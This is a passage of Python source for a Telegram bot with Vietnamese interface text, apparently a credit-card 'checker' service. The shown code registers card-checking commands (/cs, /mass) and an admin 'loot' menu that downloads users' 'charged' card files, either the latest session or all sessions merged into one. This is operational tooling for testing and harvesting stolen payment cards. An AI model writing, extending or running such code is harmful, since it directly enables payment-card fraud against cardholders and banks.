            [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
            [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
            [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Chọn một tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)

    # 1. Get Latest Charged File
    elif command == "loot" and action == "latestcharge":
        user_log_dir = os.path.join(LOG_DIR, target_user_id)
        if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
            await query.edit_message_text(f"Không có lịch sử check nào cho user `{target_user_id}`."); return
        
        latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
        file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
        
        if os.path.exists(file_path):
            await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
            await query.edit_message_text(f"✅ Đã gửi file charge gần nhất từ session `{latest_session}`.")
        else:
            await query.edit_message_text(f"ℹ️ Lần check gần nhất (`{latest_session}`) không có thẻ charge nào.")

    # 2. Get All Charged Files
    elif command == "loot" and action == "allcharge":
        user_log_dir = os.path.join(LOG_DIR, target_user_id)
        if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
            await query.edit_message_text(f"Không có lịch sử check nào cho user `{target_user_id}`."); return
            
        all_charged_content = []
        sessions = sorted(os.listdir(user_log_dir))
        for session_ts in sessions:
            file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    all_charged_content.append(f.read())
        
        if all_charged_content:
            combined_content = "\n".join(all_charged_content)
            file_to_send = io.BytesIO(combined_content.encode('utf-8'))
            filename = f"all_charged_{target_user_id}.txt"
            await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
            await query.edit_message_text(f"✅ Đã gửi file tổng hợp tất cả thẻ charge của user `{target_user_id}`.")
        else:
            await query.edit_message_text(f"ℹ️ User `{target_user_id}` không có thẻ charge nào trong lịch sử.")

    # 3. Choose from History
    elif command == "loot" and action == "history":
        user_log_dir = os.path.join(LOG_DIR, target_user_id)
        sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
        keyboard = []
        for session_ts in sessions:
            summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
            if os.path.exists(summary_path):
                summary = load_json_file(summary_path)
                counts = summary.get('counts', {})
                try: 
                    dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S")
                    readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                except ValueError: 
                    readable_ts = session_ts
                button_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
                keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
        
        keyboard.append([InlineKeyboardButton("« Quay lại Menu Chính", callback_data=f"loot_mainmenu_{target_user_id}")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"📜 **Lịch sử check của user `{target_user_id}`:**", reply_markup=reply_markup)

    # Drill down into a session
    elif command == "loot" and action == "session":
        _, _, target_user_id, session_ts = data
        session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
        files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
        if not files:
            await query.edit_message_text("Session này không có file kết quả nào."); return
        keyboard = []
        for filename in files:
            keyboard.append([InlineKeyboardButton(f"Tải {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
        keyboard.append([InlineKeyboardButton("« Quay lại Lịch Sử", callback_data=f"loot_history_{target_user_id}")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Chọn file để tải từ session `{session_ts}`:", reply_markup=reply_markup)

    # Get a specific file
    elif command == "loot" and action == "getfile":
        _, _, target_user_id, session_ts, filename = data
        file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
        if os.path.exists(file_path):
            await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
            await query.answer(f"Đã gửi file {filename}")
        else:
            await query.answer("❌ Lỗi: Không tìm thấy file.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # Lệnh cơ bản & Quản lý
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    
    # Lệnh Admin mới
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    
    # Lệnh Check Thẻ
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # Handler cho Nút Bấm Inline
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
